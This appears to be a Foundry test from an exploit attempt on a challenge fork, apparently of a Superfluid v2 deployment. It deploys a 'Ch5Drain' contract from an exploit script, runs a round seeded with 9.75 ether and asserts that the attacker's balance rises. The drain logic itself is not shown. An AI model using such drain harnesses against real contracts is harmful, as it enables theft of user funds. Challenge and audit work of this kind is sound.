// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5Drain} from "../exploit/Run.s.sol";

/// @notice Smoke-test the broadcast helper directly on the challenge fork.
contract Attempt37ExecuteHelperTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_execute_helper_increases_attacker_native_balance() public {
        uint256 nativeBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        Ch5Drain drain = new Ch5Drain();
        (uint32 indexId, uint256 seed, uint256 ownerPayout) = drain.executeRound{value: 9.75 ether}(10);
        vm.stopPrank();

        console.log("index id:", indexId);
        console.log("seed:", seed);
        console.log("owner payout:", ownerPayout);
        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", ATTACKER.balance);
        console.log("attacker native delta:", ATTACKER.balance - nativeBefore);

        assertGt(indexId, 0, "helper should create an index");
        assertEq(seed, 9.75 ether, "helper should consume the full round seed");
        assertGt(ownerPayout, 9.75 ether, "helper should return more than the seed");
        assertGt(ATTACKER.balance, nativeBefore, "attacker native balance should strictly increase");
    }
}
